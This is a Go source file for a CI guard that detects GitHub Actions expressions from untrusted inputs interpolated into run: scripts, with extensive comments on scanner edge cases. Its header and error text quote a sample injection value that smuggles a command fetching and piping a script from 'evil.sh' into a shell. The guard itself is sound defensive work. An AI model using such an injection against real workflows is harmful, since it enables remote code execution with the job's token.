package runinjection

// guard.go implements `llz ci workflow-injection` — no externally-supplied
// expression may be interpolated into a `run:` script.
//
// WHY: `${{ }}` IS TEXTUAL SUBSTITUTION THAT HAPPENS BEFORE THE SHELL PARSES THE
// LINE. GitHub expands the expression into the script source, then runs the
// result. So a value is not data — it is syntax. A workflow_dispatch input of
//
//	v1"; curl evil.sh | sh #
//
// interpolated into `run: llz upgrade --ref "${{ inputs.ref }}"` executes the
// curl, with whatever the job's token can reach. Routed through `env:` instead,
// the shell expands "$REF" AFTER parsing and the same value is inert.
//
// IT HAPPENED HERE. A template-upgrade workflow shipped with `${{ inputs.ref }}`
// in a run: script, in a job holding a PAT with contents:write,
// pull-requests:write and workflows:write.
//
// AND actionlint DOES NOT COVER IT — note it DOES scan instance-template/, via
// instance-test on the rendered instance, so "nothing lints that tree" is not the
// argument. Measured on v1.7.7 and v1.7.12 (the versions the measurement was taken
// on, not a pin that has to track ACTIONLINT_VERSION) identically, and unchanged
// by `-shellcheck=` (its shellcheck integration
// substitutes a placeholder for the expression, so shellcheck reads the script
// AFTER substitution and the injection is gone by the time it looks). It exits 1
// on its own untrusted-input list — an ENUMERATED SET of event-payload paths
// (`github.head_ref`, the pull-request and issue title and body, comment and review
// bodies, discussion fields, commit messages, the PR head fields), including
// `*`-indexed array elements, plus the `github['event'][…]` bracket spelling of any
// of them. Enumerated, not "every `github.event.*`": `deployment.title`,
// `milestone.title` and `workflow_run.display_title` are all exit 0. The list is
// not restated here, because a second copy of someone else's list is a thing to
// keep in step forever — what matters is that it is a list, so paths outside it
// pass, and this guard's rule is the tier rather than the enumeration.
//
// It exits 0 on `inputs.*`, `github.event.inputs.*`,
// `github.ref_name`, `toJSON(github)`, `toJSON(github.event)`, and on any value
// laundered through `env:` — INCLUDING the values it flags inline, which is the
// sharper half: `github.event.pull_request.title` exits 1 in a run: script and 0
// when the same value is routed through `env:` and read as "$T". Moving it to
// `env:` is the remedy actionlint itself prescribes, and doing so removes
// actionlint's own finding while leaving the vulnerability, if the env var is then
// interpolated with `${{ }}` rather than expanded by the shell. That is the
// measurement behind the `env.*` case below. So this guard is a SUPERSET, not a
// replacement — and the half it adds is exactly the half every site remediated in
// the preceding commit was in: all eleven interpolations were `inputs.*`. And it
// is worse than "passing" for six of them — those are in `action.yml` files, which
// actionlint cannot parse at all. It reads them as malformed workflows and reports
// both `"on" section is missing` and `"jobs" section is missing` on both versions
// measured, so it has never rendered a verdict on a composite action. Five it read
// and passed; six it could not open.
//
// SCOPE: what someone outside this repo can set. `inputs.*` and `github.event.*`
// are the unambiguous half — the dispatch-or-call payload and the pull-request
// payload, neither under this repo's control. Flagged alongside them, and NOT a
// wider net than the paragraph above describes: the branch-name contexts, which
// are `github.head_ref` on a pull_request and `github.ref`, `github.ref_name` and
// `github.workflow_ref` wherever the event's ref IS a branch someone else named —
// a push or a dispatch. On a pull_request those three are server-derived instead
// (`refs/pull/N/merge`, `N/merge`, and the workflow path at that ref), so it is
// head_ref alone that carries attacker text there; bare `github`, because
// `toJSON(github)` ships the event payload without ever naming it; and `env.*`,
// which is the remedy's own back door. Each has its own case in
// externallySupplied with the measurement that put it there. `matrix.*` is a THIRD
// tier and a conditional one: a literal matrix is written in this file and safe,
// but `matrix: ${{ fromJSON(inputs.x) }}` makes every value a dispatch input
// under another name, so the taint is decided per job rather than by the tier —
// see externallyBuiltMatrix. `needs.*.outputs.*` and
// `steps.*.outputs.*` are a real second tier (a step that echoes external data
// launders it into an output) and are deliberately NOT flagged yet: six such
// references across five run: blocks today, and each was traced to a repo-computed
// producer before this was written — `llz ci rotation-plan` renders a Go bool, not
// the dispatch input it reads; `llz env resolve` and `llz env vpc` emit names out
// of the instance spec. Nothing enforces that, which is the debt: widening the
// rule belongs in its own change with its own paydown rather than riding along
// here.

import (
	"errors"
	"fmt"
	"io"
	"io/fs"
	"path/filepath"
	"regexp"
	"sort"
	"strings"

	"gopkg.in/yaml.v3"

	"github.com/akamai-consulting/lke-landing-zone/tools/internal/shared/capability"
	"github.com/akamai-consulting/lke-landing-zone/tools/internal/shared/color"
)

// scanRoots are the workflow trees checked. instance-template's is the one that
// matters most: those files are DELIVERED, so an injection there is every
// adopter's, and the real instance of this bug was in exactly that tree.
var scanRoots = []string{
	".github/workflows", "instance-template/.github/workflows",
	// COMPOSITE ACTIONS TOO, and the miss is measured rather than argued: replay
	// the workflow-trees-only cut against the tree as it stood before the
	// remediation and it reports 5 of the 11 interpolations and misses 6 — three
	// whole sites, every one of them in an action. PARTIAL BLINDNESS, NOT SILENCE,
	// which is the worse failure: a guard that names a class and returns findings
	// reads as having enumerated it, so the three it cannot see are the three
	// nobody goes looking for. One of them is the proven attacker-reachable path:
	// llz-breakglass-openbao.yml takes a `workflow_call` input `region`, hands it
	// to the cluster-access action, which hands it to fetch-kubeconfig, whose run:
	// block did KUBE_REGION="${{ inputs.region }}" — three files from the trigger,
	// and the only one of them a workflow-tree scan opens is the first.
	".github/actions", "instance-template/.github/actions",
}

// step is one run: block, in either file shape.
type step struct {
	Name string `yaml:"name"`
	Run  string `yaml:"run"`
	// With.Script is actions/github-script's body — JavaScript rather than bash,
	// and the SAME class: an expression is substituted into source before the
	// interpreter parses it, so `${{ github.event.issue.title }}` there closes the
	// string and runs. Unused in this tree today; a guard whose framing covers the
	// class should not have to be extended the day someone adds it.
	With struct {
		Script string `yaml:"script"`
	} `yaml:"with"`
}

// interpreted returns the step's script bodies — every place this guard treats a
// value as CODE rather than data.
func (s step) interpreted() []string {
	var out []string
	if s.Run != "" {
		out = append(out, s.Run)
	}
	if s.With.Script != "" {
		out = append(out, s.With.Script)
	}
	return out
}

// workflow is the sliver of an Actions file this guard reads. It covers BOTH
// shapes, because a composite action carries its steps under `runs:` rather than
// under `jobs:` — and its `run:` blocks are the same hazard with the same fix.
type workflow struct {
	Jobs map[string]struct {
		Steps []step `yaml:"steps"`
		// Strategy is read only to answer one question: is this job's matrix built
		// from attacker-supplied text? `matrix.*` is normally a literal list
		// written in the file and safe to paste into a script, which is why it sits
		// in the deferred tier — but `matrix: ${{ fromJSON(inputs.targets) }}`
		// makes every matrix.* value a dispatch input wearing a different name, and
		// treating the tier as unconditional passed that straight through.
		Strategy struct {
			// ONLY the matrix. Flattening the whole strategy node made a sibling key
			// taint the matrix: `max-parallel: ${{ inputs.parallelism }}` beside a
			// LITERAL matrix produced a finding naming the wrong problem, which is
			// the false-positive class the header says gets a guard switched off.
			Matrix yaml.Node `yaml:"matrix"`
		} `yaml:"strategy"`
	} `yaml:"jobs"`
	Runs struct {
		Steps []step `yaml:"steps"`
	} `yaml:"runs"`
}

// identifier matches every context reference inside an expression; stringLiteral
// strips the parts of one that are DATA rather than references.
//
// TWO PATTERNS, BECAUSE ONE CAPTURE IS NOT ENOUGH. The first cut captured only
// the leading reference, so a compound expression hid everything after it —
// `${{ format('{0}', github.event.pull_request.title) }}` read as `format` and
// passed. Block delimiting is findExpressions' job, not a regex's: a
// non-greedy `.*?` stopped at the first `}}`, which GitHub's own brace-escape
// puts INSIDE a string literal.
var (
	identifier = regexp.MustCompile(`[a-zA-Z_][A-Za-z0-9_.\-]*`)
	// stringLiteral strips '...' / "..." before identifiers are read. Text inside
	// a literal is DATA, not a context reference, so scanning it invents matches
	// that are not there: `${{ hashFiles('**/env.yaml') }}` read `env.yaml` as the
	// env context and failed a workflow that interpolates nothing. Adding the env
	// context is what exposed this, and a false positive on hashFiles is exactly
	// how a guard gets switched off — which the header already says.
	// SINGLE QUOTES ONLY, matching GitHub's expression syntax — it has no
	// double-quoted string literals. Treating `"…"` as one meant stripping text
	// that is not a literal, which can only ever delete real references. With the
	// scanner resuming past an undelimitable `${{` this no longer hides anything
	// on its own, so it carries no separate test: it is the rule being stated
	// correctly, not a second fix.
	stringLiteral = regexp.MustCompile(`'[^']*'`)
)

// findExpressions returns the inner text of every `${{ … }}` block, tracking
// quote state so a `}}` INSIDE a string literal does not end the block early.
//
// A NON-GREEDY REGEX GOT THIS WRONG, and silently. GitHub's own brace-escape for
// format() is `'{{'` / `'}}'`, so `${{ format('{{{0}}}', inputs.tag) }}` contains
// a `}}` inside the literal — the regex stopped there, the scan never reached
// `inputs.tag`, and the guard printed OK over a live injection. Measured at exit
// 0 before this replaced it.
func findExpressions(s string) (blocks []string, unterminated bool) {
	var out []string
	for i := 0; i+2 < len(s); {
		if s[i] != '$' || s[i+1] != '{' || s[i+2] != '{' {
			i++
			continue
		}
		j := i + 3
		var quote byte
		for j < len(s) {
			c := s[j]
			switch {
			case quote != 0:
				if c == quote {
					quote = 0
				}
			case c == '\'':
				// SINGLE QUOTES ONLY — that is GitHub's expression syntax. Treating `"`
				// as a quote made the scanner mis-track state on ordinary shell text,
				// which after an undelimitable `${{` swallowed real expressions whole.
				quote = c
			case c == '$' && j+2 < len(s) && s[j+1] == '{' && s[j+2] == '{':
				// A SECOND OPENER PROVES THE FIRST NEVER CLOSED. Expressions do not
				// nest, so reaching `${{` while still looking for `}}` means this
				// block's real terminator was the `}}` of a LATER expression — and
				// everything between became one block of raw shell, which is how
				// `cat env.yaml` was still being reported as an injection. Precise,
				// not a heuristic: resume at the opener that is actually valid.
				unterminated = true
				i = j
				goto next
			case c == '}' && j+1 < len(s) && s[j+1] == '}':
				out = append(out, s[i+3:j])
				j++
				i = j + 1
				goto next
			}
			j++
		}
		// Unterminated. Two earlier cuts each got half of this wrong. Returning here
		// swallowed the rest of the script, so a genuine expression after the stray
		// opener measured ZERO findings. Emitting the remainder AS A BLOCK instead
		// meant scanning raw shell as if it were expression text, which reported
		// `cat env.yaml` and `-f inputs.values.yaml` as injections complete with a
		// "move it to env:" remedy — false positives on ordinary commands, which is
		// how a guard gets switched off.
		//
		// So: neither. The stray opener is reported as ITSELF (the caller turns
		// unterminated into its own finding — a workflow carrying one is malformed
		// and GitHub will reject it), and scanning resumes past it so later
		// expressions are delimited normally.
		unterminated = true
		i += 3
		continue
	next:
	}
	return out, unterminated
}

// externallySupplied reports whether a context reference is a value someone
// outside this repo can set.
//
//	inputs.*            whoever dispatches the workflow, or calls the reusable
//	github.event.*      whoever opened the pull request or wrote the comment
//	github.head_ref     the PR's SOURCE BRANCH NAME — attacker-chosen text, and
//	                    GitHub's most-cited vector after github.event.*
//	github.ref_name     the same string on the branch/tag paths
//	github.ref          the same string under a refs/heads/ prefix
//	github.workflow_ref the same string inside a longer path@ref string
//	github              the whole context: `toJSON(github)` carries the payload
//	env.*               the remedy's own back door — see the case below
//
// ALL EIGHT, because this list is read as the contract. Three cases were missing
// from it — `github.ref`, `github.workflow_ref` and bare `github` — and a reader
// reconciling a short list against longer code narrows the code, which is how a
// case gets deleted. (`env.*` was already described in the prose below; it is in
// the table now so the table is the single place to look.)
//
// NOT `github.event_name`, and that distinction is the whole reason this is not a
// bare HasPrefix("github.event"). event_name and event_path are SERVER-SET — a
// prefix match flags them, which is a false positive on the most common
// expression in the tree, and false positives are how a guard gets switched off.
// The first cut had exactly that bug, in the same commit as a test claiming to
// prevent it.
//
// `env.*` is included for a reason peculiar to this guard — see the case below.
//
// `github.actor` is deliberately absent: GitHub constrains usernames to
// [A-Za-z0-9-], so it cannot carry shell syntax. Recorded so the omission reads
// as a decision rather than an oversight.
func externallySupplied(expr string) bool {
	// Lowercased first. Costs nothing either way: GitHub treats context names
	// case-insensitively, so `${{ Inputs.ref }}` is the same injection — and if it
	// did not, that expression would be invalid and never reach a runner, so
	// flagging it is harmless. A matcher that only knows one spelling is not one.
	expr = strings.ToLower(expr)
	switch {
	case expr == "inputs" || strings.HasPrefix(expr, "inputs."):
		return true
	case expr == "github.event" || strings.HasPrefix(expr, "github.event."):
		return true
	case expr == "github.head_ref" || expr == "github.ref_name" || expr == "github.ref" ||
		expr == "github.workflow_ref":
		// workflow_ref embeds the same attacker-chosen ref inside a longer string
		// (`owner/repo/.github/workflows/x.yml@refs/heads/<branch>`). Wrapping text
		// in more text does not make it safe, and leaving it out would have been the
		// omission github.actor's comment exists to prevent.
		// github.ref is the same attacker-chosen branch name under a refs/heads/
		// prefix. A prefix does not make text safe.
		return true
	case expr == "github":
		// THE WHOLE CONTEXT, which contains github.event — so it is a superset of
		// the case above, not a lesser one. Two spellings reach here and neither
		// mentions `github.event`: `${{ toJSON(github) }}` serialises the entire
		// payload (PR title included) into the script, and the bracket form
		// `${{ github['event'].pull_request.title }}` is the dotted path written
		// so a dotted-path matcher cannot see it. Both probed against the built
		// guard at 0 findings before this case existed.
		return true
	case expr == "env" || strings.HasPrefix(expr, "env."):
		// env.* IS THE REMEDY'S OWN BACK DOOR, and that makes it the likeliest way
		// this guard gets defeated. The fix this guard prescribes moves an input
		// into `env:` — so the tree now has env vars holding exactly the dangerous
		// values, and `"${{ env.DRIFT_BRANCH }}"` restores the vulnerability in full
		// while reading like compliance. It is also free to forbid: anything
		// reachable as `env.X` is reachable as `$X`, which is the safe form.
		return true
	}
	return false
}

// isMatrixRef reports whether a reference reads a matrix value.
func isMatrixRef(expr string) bool {
	// Case-folded, for the reason externallySupplied gives: `${{ Matrix.region }}`
	// is the same reference. This half was left case-sensitive, so a tainted
	// matrix read through any other spelling returned zero findings.
	expr = strings.ToLower(expr)
	return expr == "matrix" || strings.HasPrefix(expr, "matrix.")
}

// externallyBuiltMatrix reports whether a job's strategy block builds its matrix
// from an externally-supplied expression. The node is re-encoded rather than
// walked: a matrix can be set at `strategy.matrix`, at `strategy.matrix.include`,
// or on one axis, and the question here is only "does attacker text reach ANY of
// it" — which the flattened text answers without enumerating the shapes.
func externallyBuiltMatrix(matrix yaml.Node) bool {
	if matrix.IsZero() {
		return false
	}
	raw, err := yaml.Marshal(&matrix)
	if err != nil {
		// Unreadable strategy: assume tainted. A guard that cannot tell must not
		// choose the answer that makes it quiet.
		return true
	}
	rawBlocks, _ := findExpressions(string(raw))
	for _, block := range rawBlocks {
		for _, ref := range identifier.FindAllString(stringLiteral.ReplaceAllString(block, " "), -1) {
			if externallySupplied(ref) {
				return true
			}
		}
	}
	return false
}

// dedupKey identifies a finding for deduplication: the finding itself plus WHICH
// step it came from, since the printed step name is not unique.
type dedupKey struct {
	f   Finding
	idx int
}

// Finding is one interpolation that must move to `env:`.
type Finding struct {
	File, Job, Step, Expr string
	// Malformed marks a `${{` with no `}}` — a DIFFERENT defect from an injection,
	// with a different fix. Reported under the injection headline it inherited the
	// "move it to env:" remedy, which cannot repair a brace typo, and inflated a
	// count that reads as "how many injections does this file have".
	Malformed bool
}

// Scan returns every externally-supplied interpolation inside a run: script.
// Pure over parsed input, so the judgement is testable without a repo.
func Scan(file string, w workflow) []Finding {
	var out []Finding
	seen := map[dedupKey]bool{}
	// A composite action has no jobs, so its steps are collected under a synthetic
	// name that reads correctly in a finding.
	type namedSteps struct {
		job           string
		steps         []step
		matrixTainted bool
	}
	groups := []namedSteps{}
	jobs := make([]string, 0, len(w.Jobs))
	for name := range w.Jobs {
		jobs = append(jobs, name)
	}
	sort.Strings(jobs) // deterministic output; map order would shuffle findings
	for _, name := range jobs {
		groups = append(groups, namedSteps{
			job:           name,
			steps:         w.Jobs[name].Steps,
			matrixTainted: externallyBuiltMatrix(w.Jobs[name].Strategy.Matrix),
		})
	}
	if len(w.Runs.Steps) > 0 {
		groups = append(groups, namedSteps{job: "(composite action)", steps: w.Runs.Steps})
	}

	for _, g := range groups {
		jobName := g.job
		for stepIdx, step := range g.steps {
			for _, body := range step.interpreted() {
				blocks, unterminated := findExpressions(body)
				if unterminated {
					// Named rather than silently tolerated: a `${{` with no `}}` is a
					// malformed workflow GitHub will reject, and it is also the shape
					// that hid an injection from two earlier cuts of this scanner.
					name := step.Name
					if name == "" {
						name = "(unnamed step)"
					}
					f := Finding{File: file, Job: jobName, Step: name, Expr: "(unterminated ${{ )", Malformed: true}
					k := dedupKey{f, stepIdx}
					if !seen[k] {
						seen[k] = true
						out = append(out, f)
					}
				}
				for _, block := range blocks {
					expr := stringLiteral.ReplaceAllString(block, " ")
					for _, ref := range identifier.FindAllString(expr, -1) {
						if !externallySupplied(ref) && !(g.matrixTainted && isMatrixRef(ref)) {
							continue
						}
						name := step.Name
						if name == "" {
							name = "(unnamed step)"
						}
						f := Finding{File: file, Job: jobName, Step: name, Expr: ref}
						// DEDUPED. The same reference can legitimately appear more than
						// once in one step — `"${{ inputs.ref }}" … "${{ inputs.ref }}"`
						// is one defect with one fix, and printing it twice inflates the
						// count a reader uses to judge how bad the file is. It also makes
						// the sort total, since (File, Job, Step, Expr) is then unique.
						// (The original reason was a pseudo-block that double-scanned
						// every later expression; that behaviour is gone, but the dedup
						// is not vestigial.)
						// KEYED BY STEP POSITION, not step name. Name defaults to the
						// constant "(unnamed step)", so two distinct unnamed steps in one
						// job carrying the same expression collapsed into one finding —
						// under-reporting, not a false pass, but a reader counting
						// findings to judge a file gets the wrong number.
						k := dedupKey{f, stepIdx}
						if seen[k] {
							continue
						}
						seen[k] = true
						out = append(out, f)
					}
				}
			}
		}
	}
	return out
}

// Run fails when any delivered or first-party workflow interpolates an
// externally-supplied expression into a run: script.
func Run(root string, out, errOut io.Writer) error {
	repo := capability.RepoForGate(Extension(), root)

	var findings []Finding
	scanned := 0
	perRoot := map[string]int{}
	for _, r := range scanRoots {
		err := repo.WalkDir(filepath.FromSlash(r), func(p string, d fs.DirEntry, err error) error {
			if err != nil {
				// An absent root is legitimate: this also runs in an instance
				// checkout, which has no instance-template/ of its own.
				if errors.Is(err, fs.ErrNotExist) {
					return nil
				}
				return err
			}
			if d.IsDir() || !(strings.HasSuffix(d.Name(), ".yml") || strings.HasSuffix(d.Name(), ".yaml")) {
				return nil
			}
			b, rerr := repo.ReadFile(p)
			if rerr != nil {
				return rerr
			}
			var w workflow
			if uerr := yaml.Unmarshal(b, &w); uerr != nil {
				// A workflow this guard cannot parse is one it cannot vouch for.
				return fmt.Errorf("%s: %w", filepath.ToSlash(p), uerr)
			}
			scanned++
			perRoot[r]++
			findings = append(findings, Scan(filepath.ToSlash(p), w)...)
			return nil
		})
		if err != nil {
			return fmt.Errorf("workflow-injection: %w", err)
		}
	}
	// VACUITY IS ONLY A QUESTION ON THE PASS PATH. Run before the findings report,
	// these checks pre-empt a real injection with a complaint about corpus size —
	// the guard would then name the wrong problem in the one case it exists for.
	if len(findings) == 0 {
		// PER ROOT, not just in total. A single aggregate count cannot tell "this root
		// is legitimately absent" from "this root moved and I am now scanning half the
		// tree" — and the half that goes missing this way is the DELIVERED one, since
		// the template's own .github/ is the root that always resolves. The result is a
		// confident OK over the template's own files while every file that reaches an
		// adopter goes unexamined. (Deliberately not a file count: the trees grow, and
		// a comment carrying a number that decays is the defect this guard's own
		// header spent a commit correcting.)
		//
		// FIRST: an empty corpus is a wrong --root, and it must say so. Run after the
		// per-root loop this was unreachable — .github/workflows always returns from
		// there first, so a wrong root reported "the tree moved".
		if scanned == 0 {
			return fmt.Errorf("workflow-injection: no workflows found under %s — refusing to pass vacuously",
				strings.Join(scanRoots, ", "))
		}

		// The absence is only legitimate in an instance checkout, which has no
		// instance-template/ at all — so the TREE's existence is the discriminator.
		for _, r := range scanRoots {
			if perRoot[r] > 0 {
				continue
			}
			// EVERY ROOT, not just the delivered ones. An earlier cut exempted the
			// first-party roots "because the aggregate check covers them" — it does
			// not: the aggregate counts across ALL roots, and .github/workflows alone
			// keeps it non-zero. .github/actions holds one file, so moving it printed
			// a confident OK over every other file in the tree having never read a
			// first-party composite action — the same omission, one root over, that left
			// this guard's first cut blind to three of the seven live sites: setup-llz
			// here, and fetch-kubeconfig and terraform-init in the DELIVERED action tree.
			//
			// THREE CASES, THREE ANSWERS. Reporting "the delivered tree moved" for a
			// root that is present and merely empty names the wrong cause, and a wrong
			// cause sends the reader looking for a rename that never happened.
			if _, err := repo.Stat(filepath.FromSlash(r)); err == nil {
				return fmt.Errorf("workflow-injection: %s exists but holds no workflows — "+
					"a root this guard scans must not be empty", r)
			}
			// THE TREE ROOT, not the root's parent directory. The parent of a delivered
			// root is itself INSIDE the tree a rename moves, so renaming the delivered
			// .github away made the discriminator fail and the guard print OK over the
			// first-party files with every delivered one unread. Probed.
			tree, _, nested := strings.Cut(r, "/")
			if !nested || tree == ".github" {
				// A first-party root: the tree root is the repo, which always exists,
				// so an absent root is always a move and never "not applicable".
				return fmt.Errorf("workflow-injection: %s yielded no workflows — "+
					"the tree moved and this run would have passed over it", r)
			}
			if _, err := repo.Stat(filepath.FromSlash(tree)); err != nil {
				continue // no instance-template/ at all — an instance checkout, where
				// the delivered roots are correctly absent rather than moved.
			}
			return fmt.Errorf("workflow-injection: %s/ exists but %s yielded no workflows — "+
				"the delivered tree moved and this run would have passed over it", tree, r)
		}

	}

	if len(findings) == 0 {
		fmt.Fprintf(out, "workflow-injection: OK — no externally-supplied expression reaches a run: script (%d workflow(s))\n", scanned)
		return nil
	}

	// A TOTAL ORDER. Comparing only (File, Job) ties on every finding within a job,
	// and sort.Slice is unstable — two byte-identical files emitted their eight
	// findings in two different orders, which turns a diffable gate output into
	// noise and makes a golden test impossible.
	sort.Slice(findings, func(i, j int) bool {
		a, b := findings[i], findings[j]
		switch {
		case a.File != b.File:
			return a.File < b.File
		case a.Job != b.Job:
			return a.Job < b.Job
		case a.Step != b.Step:
			return a.Step < b.Step
		default:
			return a.Expr < b.Expr
		}
	})
	// TWO DEFECTS, TWO SECTIONS. A `${{` with no `}}` is a brace typo, not an
	// injection: printed under the injection headline it inherited the "move it to
	// env:" remedy, which cannot fix it, and it was counted as an interpolation of
	// externally-supplied input, which it is not. Every line named the wrong cause
	// — the sin this file's own vacuity comments forbid.
	var injections, malformed []Finding
	for _, f := range findings {
		if f.Malformed {
			malformed = append(malformed, f)
			continue
		}
		injections = append(injections, f)
	}

	if len(malformed) > 0 {
		fmt.Fprintln(errOut, color.Red("workflow-injection: an expression is opened with `${{` and never closed"))
		for _, f := range malformed {
			fmt.Fprintf(errOut, "    %s  job %q, step %q\n", f.File, f.Job, f.Step)
		}
		fmt.Fprintln(errOut, "\nGitHub rejects a workflow carrying one, so this is a syntax error rather than an\n"+
			"injection — and it is also the shape that hides one, since everything after the\n"+
			"stray opener stops being read as a script. Fix: close the expression.")
	}
	if len(injections) == 0 {
		return fmt.Errorf("workflow-injection: %d unterminated `${{` in run: scripts", len(malformed))
	}

	fmt.Fprintln(errOut, color.Red("workflow-injection: an externally-supplied expression is interpolated into a run: script"))
	for _, f := range injections {
		fmt.Fprintf(errOut, "    %s  job %q, step %q  →  ${{ %s … }}\n", f.File, f.Job, f.Step, f.Expr)
	}
	fmt.Fprintln(errOut, "\n"+strings.TrimSpace(`
`+"`${{ }}`"+` is substituted into the script BEFORE the shell parses it, so the value becomes
SYNTAX rather than data. An input of  v1"; curl evil.sh | sh #  executes, with whatever the
job's token can reach.

Fix: pass it through `+"`env:`"+`, where the shell expands it AFTER parsing and it cannot become
syntax:

    env:
      REF: ${{ inputs.ref }}
    run: llz upgrade --ref "$REF"
`))
	return fmt.Errorf("workflow-injection: %d interpolation(s) of externally-supplied input into run: scripts", len(injections))
}
